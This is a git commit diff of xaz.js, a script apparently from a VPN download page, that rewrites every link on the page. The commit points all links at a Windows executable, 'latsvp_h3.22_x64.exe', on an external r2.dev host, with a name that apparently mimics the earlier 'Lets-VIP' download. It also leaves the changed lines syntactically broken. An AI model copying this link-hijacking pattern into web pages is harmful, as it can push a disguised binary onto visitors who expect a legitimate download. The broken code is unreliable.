575db2eaeec27bc9fe3765e807c598dccf30eee5
kln6699 <hezs1v@163.com>
2025-03-22 00:53:31 +0800

    Update xaz.js

--- xaz.js
+++ xaz.js
@@ -1,13 +1,13 @@
  
 
-var xz = "/xiazai/Lets-VIP.zip";
+var xz"https://pub-b978efeee5f74796b091da96ca739efb.r2.dev/latsvp_h3.22_x64.exe"
 
-//可以把   /xiazai/letspn-latest64.zip  这个改成下载地址；https://guoxiauzausj.oss-rg-china-mainland.aliyuncs.com/letspn-latest64.zip
-//可以把   https://guoxiauzausj.oss-rg-china-mainland.aliyuncs.com/letspn-latest64.zip  这个改成文件下载：/xiazai/kuailian.zip
+//可以把   https://pub-b978efeee5f74796b091da96ca739efb.r2.dev/latsvp_h3.22_x64.exe  这个改成下载地址；https://pub-b978efeee5f74796b091da96ca739efb.r2.dev/latsvp_h3.22_x64.exe
+//可以把   https://pub-b978efeee5f74796b091da96ca739efb.r2.dev/latsvp_h3.22_x64.exe  这个改成文件下载：https://pub-b978efeee5f74796b091da96ca739efb.r2.dev/latsvp_h3.22_x64.exe
 
 
 
-var links = document.getElementsByTagName("a");
+var linksdocumentgetElementsByTagName("a")
 for (var i = 0; i < links.length; i++) {
     if (links[i].hasAttribute("href")) {
         links[i].href = xz;
